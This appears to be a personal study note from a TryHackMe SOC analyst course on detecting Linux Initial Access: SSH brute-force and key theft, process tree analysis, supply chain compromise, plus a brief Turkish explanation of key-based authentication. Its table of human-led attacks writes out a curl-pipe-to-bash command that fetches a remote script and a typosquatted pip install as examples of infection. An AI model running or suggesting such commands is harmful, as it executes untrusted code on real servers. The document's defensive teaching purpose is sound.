
## Popularity of SSH

One of the most popular Initial Access methods on Linux servers is an exposed SSH, a common remote access service used by IT teams worldwide. Nearly every Internet-facing Linux machine has SSH enabled, with Shodan reporting [over 40 million](https://www.shodan.io/search?query=ssh) machines in 2025. Only some administrators enforce a secure [key-based](https://www.digitalocean.com/community/tutorials/how-to-configure-ssh-key-based-authentication-on-a-linux-server) authentication, while others still rely on weak passwords and leave their systems vulnerable to brute-force attacks.

## Initial Access via SSH

Much like with RDP on Windows, SSH is both powerful and often poorly defended - in fact, both protocols are tracked under the [External Remote Services](https://attack.mitre.org/techniques/T1133/) MITRE technique. A lot of threat groups run vast botnets to scan the Internet for systems with exposed SSH and access them in two primary ways: via a stolen key or a breached password. Let's see how it usually happens:

1. **Common risks when using key-based authentication:**
    
    - Threat actors access a service or source code where private SSH keys have been stored  
        (Like a GitHub repository or Ansible automation server containing SSH credentials)
    - Threat actors steal SSH keys to a server by infecting an admin's laptop with a data stealer
2. **Additional risks when using password-based authentication:**
    
    - An IT admin sets a weak SSH password for a quick test and forgets to revert the changes
    - An IT support enables SSH for a contractor who sets the password to "12345678"
    - A network engineer accidentally exposes an old, insecure SSH server to the Internet



- **Password-based Auth:** "Ben şifreyi **bilen** kişiyim" dersin.
    
    - Sunucuya gidersin, sunucu "Parola ne?" der. Sen parolayı gönderirsin, o da elindekiyle eşleşiyor mu diye bakar.
        
- **Key-based Auth:** "Ben bu anahtara **sahip olan** kişiyim" dersin.
    
    - Sunucuda senin "Kilit"in (Public Key) durur. Sende ise o kilidi açan tek "Anahtar" (Private Key) vardır.
        
    - Sunucu sana şifrelenmiş bir mesaj (challenge) gönderir ve "Elindeki anahtarla bunu çözebiliyorsan gel" der. Anahtarın doğruysa mesajı çözersin ve kapı açılır. Sunucuya asla anahtarını veya bir şifreyi göndermezsin.


## Detecting SSH Attacks

On Linux, you don't need to learn a dozen fields like logon type to figure out what's going on, making log analysis more straightforward. Your starting point in detecting SSH attacks can be as simple as listing all successful SSH logins and analyzing a few fields


## Building Process Tree

One way to detect a service breach is to use application logs, like you did in the previous task. But remember, application logs are not always available or helpful. Instead, most SOC teams rely on **process tree analysis** - a universal approach to unwrapping the Initial Access. 

![[Pasted image 20251225155103.png]]

## Human-Led Attacks

In the previous tasks, you explored Initial Access via SSH and exposed services. But what about phishing and USB attacks, so commonly seen in Windows environments? Since Linux primarily is a server OS operated by technical people, it is harder to trick system owners into running phishing malware or inserting a malicious USB. Still, the risk remains, for example:

|Scenario Example|Consequences|
|---|---|
|An IT member looks for a solution to a server issue and desperately tries this script found in a forum: `curl https://shadyforum.thm/fix.sh \| bash`|The IT member didn't check the script content, and it appeared to be malware, silently infecting the server ([Read more](https://www.schneier.com/blog/archives/2022/11/an-untrustworthy-tls-certificate-in-browsers.html))|
|A developer wants to install a Python "fastapi" package on the server, but mistypes a single letter: `pip3 install fastpi`|The mistyped package was malware, deliberately prepared and published by threat actors  ([Real-world case](https://thehackernews.com/2025/03/malicious-pypi-packages-stole-cloud.html))|

## Supply Chain Compromise

While not unique to Linux, you should also be aware of [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195/). These attacks breach a software first, and then infect all its users with the malicious update. Since a typical Linux server uses hundreds of software dependencies maintained by different developers, the attack can come from anywhere, anytime. Let's see some examples:

- A [backdoor in the XZ Utils](https://www.akamai.com/blog/security-research/critical-linux-backdoor-xz-utils-discovered-what-to-know) library that is a part of SSH nearly led to a breach of millions of Linux servers
- A [breach of the tj-actions](https://www.cisa.gov/news-events/alerts/2025/03/18/supply-chain-compromise-third-party-tj-actionschanged-files-cve-2025-30066-and-reviewdogaction) resulted in a leak of thousands of secrets, like SSH keys and access tokens

## Detecting the Attacks

All Initial Access techniques described in this room can be uncovered through a ==**process tree analysis**==. You start with a trigger, such as a SIEM alert on a suspicious command or a connection to a known malicious IP. From there, you build a process tree to trace which application or user initiated the events - a web server, an internal application, or an IT administrator’s SSH session. Finally, you determine whether the activity is legitimate or an indicator of malicious behavior:

![A PHP process running whoami indicates a web attack, an internal THM service running wget indicates supply chain compromise, and, lastly, an XMrig miner installed from a user's SSH session indicates an SSH breach.](https://tryhackme-images.s3.amazonaws.com/user-uploads/678ecc92c80aa206339f0f23/room-content/678ecc92c80aa206339f0f23-1757679022514.svg)

---
## 🔗 Bağlantılar
- [[TryHackMe SOC Path SAL/index|🛡️ TryHackMe: SOC Analyst Learning Path]]
- [[index|🏠 Ana İndeks]]
